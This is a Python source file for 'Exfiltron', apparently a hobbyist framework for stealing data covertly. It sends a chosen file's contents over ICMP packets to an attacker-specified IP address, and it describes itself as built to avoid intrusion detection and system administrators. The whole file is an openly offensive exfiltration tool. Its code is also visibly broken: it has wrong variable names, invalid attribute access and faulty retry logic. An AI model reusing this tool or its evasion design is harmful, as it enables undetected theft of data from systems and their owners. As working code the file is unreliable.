"""
File: exfiltron.py
Author: Thomas DAniels
Purpose: This is the main running program for the Exfiltron framework. This
        program is used as a prompt for the attacker to execute his or her
        desired commands using other parts of this framework.
"""


import argparse     # For parsing command line arguments
import logging      # Get rid of that pesky scapy IPv6 warning
import sys          # If unexpected results occur, stop usage (and call your doctor)
import time         # For getting some sleep in between packets

try:
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    from scapy.all import *  # Use the almighty scapy package
except ImportError:          # Raise an error if scapy is not installed
    print("Could not import scapy. Is it installed? Are you running python2?")
    print("Exiting...")
    sys.exit()

RETRY = 3           # The number of times to resend an unanswered packet
TIMEOUT = 2.5       # Timeout = 2.5*amount_of_time_to_wait_between_each_packet
SIX_HOURS = 21600   # Six hours in terms of seconds
FOURTY_EIGHT_HOURS = 172800     # Fourty-eight hours in terms of seconds


def setArgParserOptions():
    """
    Purpose: Parses the command line args and sends them back to main for
            interpretation
    @param (NoneType) None
    @return (List) a list of parsed arguments to interpret
    """

    # Create the argument parser
    parser = argparse.ArgumentParser(
                        formatter_class=argparse.RawDescriptionHelpFormatter,
                        description=('' +
     '####### ##  ## ####### #### ####   ###### ######   #####  ##   ##\n' +
     ' ##   # ##  ##  ##   #  ##   ##    # ## #  ##  ## ##   ## ###  ##\n' +
     ' ## #    ####   ## #    ##   ##      ##    ##  ## ##   ## #### ##\n' +
     ' ####     ##    ####    ##   ##      ##    #####  ##   ## ## ####\n' +
     ' ## #    ####   ## #    ##   ##   #  ##    ## ##  ##   ## ##  ###\n' +
     ' ##   # ##  ##  ##      ##   ##  ##  ##    ##  ## ##   ## ##   ##\n' +
     '####### ##  ## ####    #### ####### ####  #### ##  #####  ##   ##\n' +

     '\nExfiltron is a data exfiltration framework designed to help you get' +
     ' data off of a machine without tripping an IDS or alerting a system' +
     ' administrator.'), prog='exfiltron.py')

    # Add the method of exfiltration option
    parser.add_argument('method', type=str, help=('This is the method of ' +
                        'exfiltration. Your options are: icmp'))

    # Add the file name option
    parser.add_argument('-f', '--file-name', type=str, help="The name of" +
                        " the file you wish to.. *ahem*... 'borrow'",
                        required=True)

    # Add the destination IP address option
    parser.add_argument('-d', '--dest-ip', type=str, help="The IP " +
                        "address you want the data sent to. Please note " +
                        "that this option is required", required=True)

    # Add the data per packet optional argument
    parser.add_argument('-a', '--data-per-packet', type=int,
                        help="By default, the amount of data stored in a " +
                        "packet is the same as it normally is to decrease " +
                        "the chances of detection by an IDS (example: ICMP" +
                        "exfiltration will have a default packet size of " +
                        "64 bytes). Use this option to send more or less " +
                        "data", default=64)

    # Add the time between packets option argument
    parser.add_argument('-t', '--time', type=int, help='By default, the' +
                        'amount of time between packets sent is 5 seconds.' +
                        ' Use this option to specify a different amount in' +
                        ' terms of seconds', default=5)

    return parser.parse_args()


def send(packets, amountOfTime):
    """
    Purpose: This function sends out all the packets created by the
            user-specified module
    @param (List) a list of packets created by scapy to send to the destIP
    @param (int) the amount of time to wait before sending another packet
    @return (NoneType) None
    """

    for packet in packets:
        for numRetries in range(0, FOURTY_EIGHT_HOURS/SIX_HOURS):
            response = sr1(packet, inter=time, retry=RETRY,
                           timeout=(TIMEOUT*amountOfTime))

        # If we don't see a response, try again in 6 hours
        if(response[0].show() is None):
            time.sleep(SIX_HOURS)
        else:
            break  # Continue on to the next packet

        # 48 hours without a response means it's time to quit
        if(numRetries == (FOURTY_EIGHT_HOURS/SIX_HOURS)-1):
            print("No server response has been seen in two days.")
            print("Exiting..")
            sys.exit()


def main():
    # Parse the commands from the command line with argparser
    args = setArgParserOptions()

    # Determine the method of exfiltration
    if(arg.method == 'icmp'):
        # Attempt to import Exfiltron's ICMP package
        try:
            import icmp
        except ImportError:
            print("Unable to import the icmp package.\nExiting...")
            sys.exit()

        send(icmp(args.DEST-IP, args.FILE-NAME, args.DATA-PER-PACKET))


if (__name__ == '__main__'):
    main()
